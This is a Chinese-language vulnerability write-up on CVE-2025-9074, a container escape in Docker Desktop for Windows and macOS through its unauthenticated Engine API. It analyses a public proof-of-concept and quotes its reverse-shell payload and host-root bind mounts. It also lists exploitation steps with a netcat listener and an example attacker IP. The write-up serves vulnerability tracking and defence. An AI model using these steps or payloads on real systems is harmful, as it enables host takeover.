## CVE-2025-9074 - Docker Desktop for Windows, Docker Desktop for macOS 容器逃逸 / 权限提升 / 未经授权访问

**漏洞编号:** CVE-2025-9074

**漏洞类型:** 容器逃逸 / 权限提升 / 未经授权访问

**影响应用:** Docker Desktop for Windows, Docker Desktop for macOS

**危害等级:** 严重

**CVSS评分:** 9.3

**影响版本:** Versions prior to Docker Desktop 4.44.3

**利用条件:** 需要在本地运行的恶意容器内执行，Docker Engine API默认开放且无需认证，也可通过SSRF利用

**POC 可用性:** 9

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 10%

## 详情

CVE-2025-9074是一个在Docker Desktop for Windows和macOS中发现的严重容器越权访问漏洞，CVSS评分为9.3。该漏洞允许在本地运行的恶意Linux容器绕过Docker的隔离机制，通过默认子网地址（192.168.65.7:2375）直接访问未经认证的Docker Engine API。成功利用此漏洞，攻击者可以实现容器逃逸，进而完全控制宿主机系统。该漏洞由安全研究员Felix Boulet发现，并已于2025年8月20日在Docker Desktop 4.44.3版本中得到修复。此漏洞对依赖Docker Desktop进行开发和生产的个人及组织构成了重大威胁，因为它允许攻击者在获得容器内立足点后，立即升级至主机系统权限。

**POC有效性分析:**
所提供的`CVE-2025-9074.sh`脚本是一个完整且高度可用的概念验证及利用代码。该脚本利用了Docker Desktop默认开放的Engine API（通常在`http://192.168.65.7:2375`且无需认证）进行交互。脚本首先通过`curl`命令向`/images/json`端点发送请求，获取一个可用的Docker镜像ID。随后，它构造一个JSON负载，用于向`/containers/create`端点发送请求以创建一个新的容器。这个JSON负载中包含了两个关键部分：
1.  `"Cmd":["/bin/bash","-c","bash -i >& /dev/tcp/'"${LHOST}"'/'"${LPORT}"' 0>&1"]`：这是一个标准的反向shell命令，指示新创建的容器连接到攻击者指定的IP和端口，并将shell重定向到该连接。
2.  `"HostConfig":{"Binds":["/mnt/host/c:/host_root_win","/:/host_root_nix"]}}`：这是实现主机文件系统访问和权限提升的核心机制。它通过bind mount的方式，将宿主机的根文件系统（在Windows上通常是`C:`盘的对应路径，在Linux/macOS上是`/`）挂载到新创建容器内的指定路径（例如`/host_root_win`或`/host_root_nix`）。
最后，脚本通过向`/containers/${ID}/start`端点发送POST请求来启动新创建的容器。一旦容器启动，反向shell将被执行，攻击者将获得宿主机的shell访问权限，并且由于根目录的挂载，可以完全控制宿主机文件系统，从而实现完整的容器逃逸和权限提升。该脚本逻辑清晰，依赖标准工具（bash和curl），并且提供了明确的使用说明和示例，表明其具备高度的利用价值和有效性。

**利用步骤:**
1.  攻击者需确保其已在受害Docker Desktop环境中获得一个恶意Linux容器的执行权限。
2.  在攻击者的控制机器上，启动一个网络监听器，例如使用Netcat工具：`nc -lvnp <LPORT>`，以等待反向shell连接。
3.  将`CVE-2025-9074.sh`脚本传输到恶意容器内部。
4.  在恶意容器中执行该POC脚本，并提供Docker Engine的IP地址（通常是`192.168.65.7`）、Docker Engine的端口（`2375`）、攻击者监听器的IP地址（`LHOST`）和端口（`LPORT`）。例如：`sh CVE-2025-9074.sh 192.168.65.7 2375 10.10.14.73 9002`。
5.  脚本将自动执行上述步骤：获取镜像、创建带有反向shell和主机目录挂载的新容器、然后启动该容器。
6.  攻击者的监听器将接收到一个来自宿主机的反向shell连接，该shell通常以root权限运行，并且由于宿主机根目录被挂载，攻击者可以访问并修改宿主机上的任意文件。

**投毒风险分析:**
对`CVE-2025-9074.sh`这份POC代码进行分析，其投毒风险评估为低（10%）。主要原因如下：
1.  **代码透明度高**: 脚本是纯粹的shell脚本，未进行任何混淆处理。其所有操作，包括对Docker API的HTTP请求、JSON负载的构建以及反向shell命令，都清晰可见，易于人工审查和理解。
2.  **依赖标准工具**: 脚本仅依赖于`bash`和`curl`这两个在Linux环境中普遍存在的标准工具。没有引入任何非标准或可疑的第三方库或二进制文件。
3.  **无外部资源引用**: 脚本没有从外部URL下载或执行任何额外的代码、脚本或文件。所有功能都封装在单个脚本文件内部。
4.  **无隐藏恶意行为**: 脚本的唯一目的和行为是利用已知的Docker Desktop漏洞，建立一个到攻击者控制机器的反向shell，并通过挂载主机文件系统实现权限提升。除了这些明确的漏洞利用步骤外，没有发现任何尝试进行数据窃取、持久化、后门植入或与未声明的第三方通信的隐藏行为。
5.  **目的明确**: 该POC旨在演示漏洞的利用方式，而非作为恶意软件传播。其设计符合安全研究中POC的典型特征。

尽管投毒风险较低，但在任何生产或敏感环境中，强烈建议用户在使用任何公开的POC或工具之前，始终在其受控的隔离环境中进行详细的代码审查和安全测试，以确保其行为完全符合预期，并防范潜在的、即使是低概率的投毒风险。

**项目地址:** https://github.com/zenzue/CVE-2025-9074

**漏洞详情:** https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-9074
